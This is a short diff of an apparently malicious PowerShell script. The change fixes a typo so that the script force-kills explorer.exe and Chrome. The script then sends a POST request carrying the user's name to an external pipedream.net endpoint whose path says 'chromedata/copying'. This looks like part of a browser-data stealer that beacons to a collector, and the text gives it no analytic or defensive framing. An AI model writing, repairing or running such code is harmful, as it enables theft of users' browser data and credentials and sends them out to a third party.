@@ -1,6 +1,6 @@
 if (Get-Process Chrome) {
   taskkill /f /im explorer.exe
-  taskill /f /im chrome.exe
+  taskkill /f /im chrome.exe
 }
 
 curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/copying/$env:username" -method post
